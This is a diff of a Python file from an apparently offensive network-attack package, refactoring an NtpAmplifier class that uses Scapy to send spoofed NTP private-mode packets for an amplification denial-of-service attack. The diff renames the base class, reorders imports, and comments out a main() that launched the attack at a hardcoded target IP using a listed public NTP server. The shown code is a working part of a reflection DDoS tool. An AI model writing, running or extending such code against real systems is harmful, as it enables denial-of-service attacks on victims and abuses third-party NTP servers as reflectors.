@@ -1,8 +1,9 @@
-from src.attacker import Attacker
+from scapy.all import IP, UDP, NTPPrivate, RandShort, send
 
-from scapy.all import IP, NTPPrivate, RandShort, send, UDP
+from netattacker.attacker import AttackerBaseClass
 
-class NtpAmplifier(Attacker):
+
+class NtpAmplifier(AttackerBaseClass):
 	"""
 	Parameters
 	----------
@@ -48,11 +49,11 @@ class NtpAmplifier(Attacker):
 		#send(ip/udp/ntp, verbose=False, loop=True)
 		send(ip/udp/ntp, verbose=False)
 
-def main():
-	a = NtpAmplifier("172.20.10.3", ["88.28.204.54"])
-	a.print_target_ip()
-	a.print_target_ntp_addrs()
-	a.start()
+# def main():
+# 	a = NtpAmplifier("172.20.10.3", ["88.28.204.54"])
+# 	a.print_target_ip()
+# 	a.print_target_ntp_addrs()
+# 	a.start()
 
-if __name__ == "__main__":
-	main()
+# if __name__ == "__main__":
+# 	main()
